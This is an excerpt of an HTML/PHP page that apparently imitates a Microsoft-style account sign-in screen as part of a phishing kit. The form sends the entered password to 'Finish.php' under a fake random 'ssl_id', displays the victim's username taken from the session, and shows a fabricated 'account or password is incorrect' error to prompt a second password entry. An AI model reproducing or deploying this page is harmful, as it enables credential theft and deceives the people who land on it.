...
<html dir="ltr" class="" lang="en">
   ...
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
         ...
         <form name="f1" id="i0281" method="post" action="Finish.php?ssl_id=<?php echo generateRandomString(130); ?>">
            ...
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['username']; ?>"><?php echo $_SESSION['username']; ?></div> </div></div> </div>
                              <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                                 ...
                                 <div class="row">
                                   <div role="alert" aria-live="assertive"><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.p, click: resetPassword_onClick } }">Your account or password is incorrect. If you don’t remember your password, <a id="idA_IL_ForgotPassword0" href="#">reset it now.</a><!-- HR=80041012 --></div><!-- /ko --> </div>
